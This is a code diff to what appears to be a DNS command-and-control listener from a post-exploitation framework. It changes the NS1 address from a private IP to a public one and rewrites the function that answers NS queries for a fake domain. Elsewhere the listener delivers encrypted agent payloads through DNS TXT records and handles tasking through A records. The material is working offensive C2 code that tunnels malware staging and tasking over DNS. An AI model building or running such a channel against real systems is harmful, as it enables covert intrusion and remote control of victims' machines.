@@ -113,7 +113,7 @@ class Listener:
             'IPNS1' : {
                 'Description'   :   'IP address for NS1',
                 'Required'      :   True,
-                'Value'         :   '192.168.1.1'
+                'Value'         :   '52.56.80.157'
             },
             'NS2Hostname' : {
                 'Description'   :   'Hostname for NS2 record',
@@ -543,7 +543,15 @@ def send_message(packets=None):
     def default_response(self):
         print "default response"
         return "default response"
-        
+
+    def send_ns_response(self, fake_domain, reply_hostname, reply_ipaddr, reply_addr_tuple, sock, reply_id, reply_qd):
+        reply = DNS(
+            id=reply_id, qr=1, ancount=1, qdcount=1, arcount=1,
+            qd=reply_qd,
+            an=DNSRR(rrname=fake_domain, type='NS', rdata=reply_hostname+'.'+fake_domain, ttl=86400),
+            ar=DNSRR(rrname=str(reply_hostname), type='A', rdata=reply_ipaddr, ttl=86400))    
+        sock.sendto(bytes(reply), reply_addr_tuple)
+
     def send_a_record_reply(self, sock, reply_hostname, reply_ipaddr, reply_addr_tuple):
         reply = DNS(
             ancount=1, qr=1,
@@ -750,12 +758,6 @@ def send_message(packets=None):
                         encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, zlib.compress(agentCode,9))
                         # TODO: wrap ^ in a routing packet?
                         self.send_payload_via_txt(hostname, sock, encryptedAgent, addr, txtstoptransfer)
-
-    def send_ns_response(self, reply_hostname, reply_ipaddr, reply_addr_tuple, sock, reply_id):
-        reply = DNS(
-            id=reply_id,ancount=1, qr=1,
-            an=DNSRR(rrname=str(reply_hostname), type='NS', rdata=reply_ipaddr, ttl=1234))
-        sock.sendto(bytes(reply), reply_addr_tuple)
     
     def start_server(self, listenerOptions):
         """
@@ -828,8 +830,6 @@ def send_message(packets=None):
                         elif host.startswith(taskinghostname):
                             print "[TASKING A]"
                             tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer)
-                        elif host.startswith():
-                            print ""
                         else:
                             self.default_response()
                     elif dns[DNSQR].qtype == 16:
@@ -853,7 +853,7 @@ def send_message(packets=None):
                     elif dns[DNSQR].qtype == 2:
                         # NS request recvd
                         if host.startswith(fake_domain):
-                            self.send_ns_response(host, ns1hostname + '.' + fake_domain, addr, sock, dns.id)
+                            self.send_ns_response(fake_domain, ns1hostname, ipns1, addr, sock, dns.id, dns.qd)
                     else:
                         self.default_response()
         except (KeyboardInterrupt, SystemExit):
